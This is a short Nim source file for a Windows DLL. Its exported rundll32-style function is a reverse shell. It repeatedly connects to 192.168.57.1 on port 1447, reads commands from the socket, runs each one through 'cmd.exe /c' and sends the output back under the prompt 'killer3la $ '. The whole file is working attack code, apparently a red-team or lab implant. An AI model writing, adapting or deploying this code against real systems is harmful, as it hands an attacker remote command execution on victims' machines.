# nim -d:mingw --app=lib --cpu=amd64 --nomain c mydll.nim

import winim/lean
import net, osproc, strformat


proc NimMain() {.cdecl, importc.}


proc MyExportedFunction(hwnd: HWND, hinst: HINSTANCE, lpszCmdLine: LPSTR, nCmdShow: int) {.stdcall, exportc, dynlib.} =
    # variables
        let
            ip = "192.168.57.1"
            port = 1447
            sock = newSocket()
            prompt = "killer3la $ "

        # connection
        while true:
            try:
                sock.connect(ip, Port(port))
            except:
                continue

            break
        
        # loop remote shell
        while true:
            send(sock, prompt)
            let args = recvLine(sock)

            # execute
            try:
                let cmd = execProcess(fmt"cmd.exe /c" & args)
                send(sock, cmd)

            # disconnect
            except:
                break
    

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    if fdwReason == DLL_PROCESS_ATTACH:
        NimMain()
    return true
